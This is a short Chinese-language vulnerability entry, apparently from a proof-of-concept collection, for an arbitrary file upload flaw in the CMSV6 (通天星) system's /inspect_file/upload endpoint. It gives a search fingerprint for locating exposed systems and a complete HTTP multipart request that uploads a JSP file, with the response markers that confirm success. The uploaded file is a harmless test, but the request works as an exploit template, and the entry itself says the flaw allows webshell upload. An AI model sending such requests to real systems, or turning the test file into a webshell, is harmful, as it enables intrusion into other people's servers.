﻿# 通天星-CMSV6-inspect_file-upload 任意文件上传漏洞

> 更新时间：2024-03-27

> 漏洞编号：

> 漏洞说明：通天星CMSV6系统/inspect_file/upload接口存在一个任意文件上传漏洞，该漏洞使得攻击者可以在受影响的系统上传webshell。

> 漏洞特征：body="808gps"

> 验证脚本：HTTP

```
POST /inspect_file/upload HTTP/1.1
Accept: */*
Content-Type: multipart/form-data;boundary=-----------------------------7db372eb000e2

-----------------------------7db372eb000e2
Content-Disposition: form-data; name="uploadFile"; filename="dudesite.jsp"
Content-Type: application/octet-stream

<% out.println(11*11);%>
-----------------------------7db372eb000e2--
```

> 响应代码特征：200

> 响应内容特征：121

> 上传文件定位：

> 验证文件来源：通天星-CMSV6-inspect_file-upload 任意文件上传漏洞.poc

